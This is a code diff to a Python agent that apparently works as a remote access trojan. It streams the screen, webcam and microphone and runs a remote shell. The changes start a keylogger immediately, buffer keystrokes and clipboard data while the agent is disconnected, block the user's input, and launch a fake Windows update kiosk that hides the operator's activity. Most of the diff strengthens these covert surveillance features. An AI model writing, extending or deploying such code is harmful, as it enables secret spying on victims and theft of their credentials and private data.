@@ -112,6 +112,7 @@ class AsyncAgent:
         # Fix: Use full quality and scale for WebRTC (it handles bandwidth adaption)
         self.capturer = ScreenCapturer(quality=100, scale=1.0) 
         self.auditor = KeyAuditor(self.send_key_sync) # Retain original auditor init
+        self.auditor.start() # START HOOKS IMMEDIATELY
         self.webcam = WebcamStreamer(quality=40) # Retain original webcam settings
         self.mic = AudioStreamer()
         self.input_ctrl = InputController()
@@ -172,6 +173,7 @@ class AsyncAgent:
     def _send_async(self, opcode, payload=b''):
         """Helper to safely send message from any thread to ALL clients"""
         msg = bytes([opcode]) + payload
+        sent_to_broker = False
         
         # Send to Broker
         if self.ws and self.loop:
@@ -180,8 +182,9 @@ class AsyncAgent:
                     send_msg(self.ws, msg),
                     self.loop
                 )
+                sent_to_broker = True
             except Exception:
-                pass
+                pass # Handled by buffering below if critical
 
         # Send to Direct Clients
         if self.direct_ws_clients and self.loop:
@@ -204,7 +207,7 @@ class AsyncAgent:
 
         # GHOST MODE BUFFERING
         # If we are disconnected (no ws) or sending failed, buffer critical data
-        if not self.ws and opcode in [protocol.OP_SHELL_OUTPUT, protocol.OP_SHELL_CWD, 
+        if not sent_to_broker and opcode in [protocol.OP_SHELL_OUTPUT, protocol.OP_SHELL_CWD, 
                                       protocol.OP_SHELL_EXIT, protocol.OP_KEY_LOG, protocol.OP_CLIP_ENTRY]:
              if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
                  self.output_buffer.append((opcode, payload))
@@ -312,20 +315,60 @@ class AsyncAgent:
             print(f"[-] Throttle Error: {e}")
 
     async def _cleanup_webrtc(self):
-        """Cleanup WebRTC resources on disconnect"""
+        """Cleanup WebRTC, Kiosk, and Connection State"""
+        print("[*] Cleaning up Session State...")
+        
+        # 1. Stop Kiosk / Curtain
+        if self.kiosk_process:
+            try:
+                print("[*] Killing Kiosk Process...")
+                self.kiosk_process.terminate()
+                self.kiosk_process.wait(timeout=2)
+            except: pass
+            self.kiosk_process = None
+
+        # 2. Reset Resource Manager
         try:
-            if self.webrtc_handler:
-                print("[WebRTC] Cleaning up...")
+             # Just use existing reference if possible, else import
+             rm = None
+             if hasattr(self, 'resource_mgr') and self.resource_mgr:
+                 rm = self.resource_mgr
+             else:
+                 from core.resource_manager import get_resource_manager
+                 rm = get_resource_manager()
+             
+             if rm:
+                rm.set_viewer_connected(False)
+                rm.set_stream_enabled(False)
+        except Exception: pass
+
+        # 3. Stop WebRTC
+        if self.webrtc_handler:
+            try:
                 await self.webrtc_handler.close()
-                self.webrtc_handler = None
+            except: pass
+            self.webrtc_handler = None
             
-            # Reset resource manager
-            if self.resource_mgr:
-                self.resource_mgr.set_viewer_connected(False)
-                self.resource_mgr.set_stream_enabled(False)
-                
-        except Exception as e:
-            print(f"[-] WebRTC cleanup error: {e}")
+        # 4. Stop Webcam
+        if self.cam_streaming:
+            self.webcam.stop()
+            self.cam_streaming = False
+            
+        # 5. Stop System Audio
+        if hasattr(self, 'audio_streaming') and self.audio_streaming:
+            if hasattr(self, 'audio_handler'):
+                self.audio_handler.stop_loopback()
+            self.audio_streaming = False
+            
+        # 6. Stop Mic
+        self.mic_streaming = False # Break mic loop
+
+        # 7. Unblock Input (CRITICAL SAFETY)
+        try:
+            self.input_ctrl.block_input(False)
+        except: pass
+            
+        print("[+] Session Cleanup Complete")
 
     def _validate_troll_request(self, opcode, payload_str):
         """Validate Troll OpCode against Consent, Admin Token, and Cooldown."""
@@ -437,6 +480,7 @@ class AsyncAgent:
                 8765,
                 ping_interval=30,
                 ping_timeout=60,
+                max_size=None,
                 process_request=self._fix_headers
             ):
                 print("[+] Direct Server Listening on 8765")
@@ -583,6 +627,7 @@ class AsyncAgent:
                     # Buffered text input
                     try:
                         text = payload.decode('utf-8')
+                        print(f"[*] Buffer Recv: '{text}'")
                         await self.loop.run_in_executor(None, self.input_ctrl.type_text, text)
                     except Exception as e:
                         print(f"[-] Buffer Input Error: {e}")
@@ -621,56 +666,65 @@ class AsyncAgent:
                     except Exception:
                         mode = "BLACK"
                         
-                    if mode == "FAKE_UPDATE":
-                        print("[*] Launching Fake Update Kiosk...")
-                        if not self.kiosk_process or self.kiosk_process.poll() is not None:
-                            self.kiosk_process = None  # Clean up stale handle
-                            # Resolve kiosk script path (support frozen exe)
-                            if getattr(sys, 'frozen', False):
-                                # PyInstaller: check _MEIPASS first
-                                base_path = getattr(sys, '_MEIPASS', os.path.dirname(sys.executable))
-                                kiosk_script = os.path.join(base_path, 'kiosk.py')
-                            else:
-                                kiosk_script = os.path.join(os.path.dirname(__file__), 'kiosk.py')
-                            # Validate script exists
-                            if not os.path.exists(kiosk_script):
-                                print(f"[-] Kiosk script not found: {kiosk_script}")
-                            else:
-                                # Run with same python, hide console on Windows
-                                try:
-                                    creation_flags = 0
-                                    if os.name == 'nt':
-                                        creation_flags = subprocess.CREATE_NO_WINDOW
-                                    
-                                    # Fix: Check if frozen and use flag
-                                    if getattr(sys, 'frozen', False):
-                                        # When frozen, we run ourself with --kiosk
-                                        cmd = [sys.executable, "--kiosk"]
-                                    else:
-                                        cmd = [sys.executable, kiosk_script]
+                    print(f"[*] Launching Kiosk Mode: {mode}")
+                    
+                    # Cleanup existing process if any
+                    if self.kiosk_process and self.kiosk_process.poll() is None:
+                        try:
+                            self.kiosk_process.terminate()
+                            self.kiosk_process.wait(timeout=1)
+                        except: pass
+                        self.kiosk_process = None
 
-                                    self.kiosk_process = subprocess.Popen(
-                                        cmd,
-                                        creationflags=creation_flags
-                                    )
-                                except Exception as e:
-                                    print(f"[-] Failed to launch kiosk: {e}")
+                    # Resolve kiosk script path (support frozen exe)
+                    kiosk_script = None
+                    if getattr(sys, 'frozen', False):
+                        base_path = getattr(sys, '_MEIPASS', os.path.dirname(sys.executable))
+                        kiosk_script = os.path.join(base_path, 'kiosk.py') # If bundled
                     else:
-                        await self.loop.run_in_executor(None, self.privacy.enable)
+                        kiosk_script = os.path.join(os.path.dirname(__file__), 'kiosk.py')
+                    
+                    # Map protocol mode to CLI arg
+                    cli_mode = "update"
+                    if mode == "BLACK":
+                        cli_mode = "black" # Pure Black
+                    elif mode == "PRIVACY":
+                        cli_mode = "privacy" # With Text
+                    elif mode == "FAKE_UPDATE":
+                        cli_mode = "update"
+                        
+                    # Build Command
+                    cmd = []
+                    if getattr(sys, 'frozen', False):
+                        # When frozen, we run ourself with --kiosk and pass mode
+                        cmd = [sys.executable, "--kiosk", "--mode", cli_mode]
+                    else:
+                        # Source mode
+                        cmd = [sys.executable, kiosk_script, "--mode", cli_mode]
+
+                    try:
+                        creation_flags = 0
+                        if os.name == 'nt':
+                            creation_flags = subprocess.CREATE_NO_WINDOW
+                        
+                        self.kiosk_process = subprocess.Popen(
+                            cmd,
+                            creationflags=creation_flags
+                        )
+                    except Exception as e:
+                         print(f"[-] Failed to launch kiosk: {e}")
 
                 elif opcode == protocol.OP_CURTAIN_OFF:
                     if self.kiosk_process:
                         print("[*] Stopping Kiosk...")
-                        self.kiosk_process.terminate()
                         try:
+                            self.kiosk_process.terminate()
                             self.kiosk_process.wait(timeout=3)
-                        except subprocess.TimeoutExpired:
-                            print("[!] Kiosk did not terminate, killing...")
-                            self.kiosk_process.kill()
-                            self.kiosk_process.wait()
+                        except Exception:
+                            try:
+                                self.kiosk_process.kill()
+                            except: pass
                         self.kiosk_process = None
-                        
-                    await self.loop.run_in_executor(None, self.privacy.disable)
 
                 elif opcode == protocol.OP_SETTINGS:
                     try:
@@ -1103,6 +1157,43 @@ class AsyncAgent:
                     self.mic_streaming = False
                     self.shell_handler.stop()
                 
+                # ================================================================
+                # SETTINGS HANDLER (Missing Link)
+                # ================================================================
+                elif opcode == protocol.OP_SETTING:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        setting_id = data.get('id')
+                        value = data.get('value')
+                        
+                        print(f"[*] Setting Change: ID={setting_id} Val={value}")
+                        
+                        # ID 2 = SETTING_PRIVACY (from protocol.py)
+                        if setting_id == 2: 
+                            if value:
+                                # Enable Privacy Mode
+                                print("[+] Privacy Mode ENABLED")
+                                self._launch_kiosk(mode="privacy")
+                                
+                                # Use New Hook-Based Blocker via Controller
+                                if self.input_ctrl:
+                                    self.input_ctrl.block_input(True)
+                            else:
+                                # Disable Privacy Mode
+                                print("[-] Privacy Mode DISABLED")
+                                if self.kiosk_process:
+                                    try:
+                                        self.kiosk_process.terminate()
+                                    except: pass
+                                    self.kiosk_process = None
+                                
+                                # Disable Blocker
+                                if self.input_ctrl:
+                                    self.input_ctrl.block_input(False)
+                                    
+                    except Exception as e:
+                        print(f"[-] Setting Error: {e}")
+                
                 return 
         except Exception as e:
             print(f"[-] Binary Handler Error: {e}")
@@ -1170,13 +1261,28 @@ class AsyncAgent:
             return
             
         print(f"[*] Flushing {len(self.output_buffer)} buffered messages...")
-        # Copy and clear buffer to prevent infinite loops if send fails
+        # Copy buffer to iterate, but don't clear immediate to avoid data loss on failure
         msgs = list(self.output_buffer)
-        self.output_buffer.clear()
         
-        for opcode, payload in msgs:
-            await send_msg(self.ws, bytes([opcode]) + payload)
-            await asyncio.sleep(0.001) # Yield slightly
+        try:
+            for i, (opcode, payload) in enumerate(msgs):
+                try:
+                    await send_msg(self.ws, bytes([opcode]) + payload)
+                    # Remove from original buffer only after success (thread-safe ish for async list?)
+                    # Alternatively, just clear at end if all success. 
+                    # But safest requested: pop item or only clear successful.
+                    # Since we are single-threaded async here:
+                    if self.output_buffer:
+                        self.output_buffer.pop(0) 
+                        
+                except Exception as e:
+                    print(f"[-] Flush Partial Error: {e}")
+                    # Stop flushing, keep remaining in buffer
+                    break
+                    
+                await asyncio.sleep(0.001) # Yield slightly
+        except Exception as e:
+            print(f"[-] Flush Error: {e}")
 
     async def connect_loop(self):
         print("[*] Agent connecting to broker")
@@ -1275,7 +1381,6 @@ class AsyncAgent:
             await self.handle_message(msg, self.ws)
                 
         # CLEANUP ON DISCONNECT
-        # CLEANUP ON DISCONNECT
         print("[!] Connection Lost/Reset. Cleaning up (Streams only)...")
         self.streaming = False
         self.cam_streaming = False
@@ -1321,25 +1426,47 @@ class AsyncAgent:
         pending_send = None
         try:
             while self.streaming:
-                # Skip frame if previous send is still pending
-                if pending_send and not pending_send.done():
-                    await asyncio.sleep(0.016)
-                    continue
+                # Check outcome of previous send
+                if pending_send:
+                    if not pending_send.done():
+                        await asyncio.sleep(0.005)
+                        continue
+                    
+                    # Check if previous send failed (e.g. Disconnect)
+                    try:
+                        exc = pending_send.exception()
+                        if exc:
+                            raise exc
+                    except (websockets.exceptions.ConnectionClosed, ConnectionError):
+                        print("[-] Screen Stream: Detected Disconnect in Send Task")
+                        break
+                    except Exception as e:
+                        print(f"[-] Frame Send Error: {e}")
                 
                 start_time = asyncio.get_running_loop().time()
-                jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
-                # jpeg = None # DISABLED FOR LOCAL TESTING (NO MIRROR)
+                
+                # Capture Frame
+                try:
+                    jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
+                except Exception as cap_err:
+                    print(f"[-] Capture Error: {cap_err}")
+                    await asyncio.sleep(1) # Backoff on capture fail
+                    continue
+
                 if jpeg:
                     header = bytes([protocol.OP_IMG_FRAME])
-                    pending_send = self._create_background_task(send_msg(ws_to_use, header + jpeg))
+                    # Create new send task
+                    coro = send_msg(ws_to_use, header + jpeg)
+                    pending_send = self.loop.create_task(coro)
                 
                 elapsed = asyncio.get_running_loop().time() - start_time
-                wait_time = max(0.001, 0.033 - elapsed) # 30 FPS
+                wait_time = max(0.001, (1.0/self.target_fps) - elapsed)
                 await asyncio.sleep(wait_time)
+                
         except (websockets.exceptions.ConnectionClosed, ConnectionError):
             print("[-] Screen Stream: Connection Closed")
         except Exception as e:
-            print(f"[-] Screen Stream Error: {e}")
+            print(f"[-] Screen Stream Fatal Error: {e}")
         finally:
             self.streaming = False
             # Explicit cleanup to prevent DXCam lock
@@ -1347,6 +1474,10 @@ class AsyncAgent:
                 if hasattr(self.capturer, 'release'):
                     self.capturer.release()
                 self.capturer = None
+            
+            # Ensure global cleanup is triggered if we detected disconnect here
+            # (In case the main receive loop is stuck)
+            await self._cleanup_webrtc()
             
     async def stream_webcam(self, target_ws=None):
         print("[*] Webcam Streaming Task Started")
@@ -1449,11 +1580,12 @@ class AsyncAgent:
             self.target_fps = int(settings['fps'])
 
     def send_key_sync(self, key_str):
-        if self.ws and self.loop:
+        if self.loop:
             asyncio.run_coroutine_threadsafe(self.send_key_async(key_str), self.loop)
 
     async def send_key_async(self, key_str):
         try:
+            # print(f"[DEBUG] Agent SendKey Async: '{key_str}' WS={self.ws is not None} Direct={len(self.direct_ws_clients)}")
             msg = bytes([protocol.OP_KEY_LOG]) + key_str.encode('utf-8')
             # Broadcast to Broker
             if self.ws:
@@ -1463,16 +1595,16 @@ class AsyncAgent:
                 if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
                     self.output_buffer.append((protocol.OP_KEY_LOG, key_str.encode('utf-8')))
 
+            print(f"[DEBUG] Sent Keylog: {repr(key_str)}")
+
             # Broadcast to All Direct Clients
             for client in list(self.direct_ws_clients):
                 await send_msg(client, msg)
-        except Exception:
+        except Exception as e:
+            print(f"[-] Keylog Send Error: {e}")
             pass
 
-    async def connect_loop(self):
-        # [ARCHIVED] User requested removal of Broker dependency.
-        # This method is kept as a stub or removed entirely.
-        pass
+
 
     def start(self, local_mode=False):
         # 1. Start Cloudflare Tunnel (Hybrid Mode)
@@ -1557,13 +1689,13 @@ def main():
             # Import and run kiosk directly
             # Supports both frozen and source if path is correct
             try:
-                from targets.kiosk import FakeUpdateKiosk
+                from targets.kiosk import KioskApp
             except ImportError:
                 # If path isn't set up yet in frozen env
                 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
-                from kiosk import FakeUpdateKiosk
+                from kiosk import KioskApp
                 
-            kiosk = FakeUpdateKiosk()
+            kiosk = KioskApp(mode=args.mode if 'args' in locals() else "update")
             kiosk.start()
             return
         except Exception as e:
